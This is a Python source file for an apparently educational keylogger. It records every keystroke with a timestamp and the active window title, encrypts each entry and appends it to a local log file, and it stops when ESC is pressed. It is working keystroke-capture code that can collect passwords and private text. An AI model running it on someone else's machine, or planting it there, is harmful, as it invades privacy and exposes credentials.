from pynput import keyboard
from datetime import datetime 
from keyLogging.encryptor import encrypt_data
import json 
import time
import pygetwindow as gw

#Define log file path and output start message 
log_file ="logs/keylog.enc"
print("Logging Started! Press ESC to exit!")

#Recording the start time of the logging session
start_time = time.time()

#Function to handle key presses
def on_press(key):
    try: 
        key_data = key.char
    except AttributeError:
        key_data = str(key)
    
    #Stop logging when ESC is pressed and display session duration
    if key == keyboard.Key.esc:
        print("Logging Stopped! View logs to see the captured keystrokes!")
        duration = time.time() - start_time
        print(f"Session Duration: {duration:.2f} seconds")
        return False

    #Get the active window title and create a log entry with key, timestamp, and window information
    window= gw.getActiveWindowTitle()
    entry = {
        "Key": key_data,
        "Timestamp": str(datetime.now()),
        "Window": window if window else "Unknown"
    }

    write_log(entry)

#Function to write log entries to the encrypted log file
def write_log(entry):
    data = json.dumps(entry)
    encrypted_data = encrypt_data(data)
    
    with open(log_file, "ab") as f:
        f.write(encrypted_data + b"\n")

#Function to start the keylogger
def start():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

#Run the keylogger if this script is executed 
if __name__ == "__main__":
    start()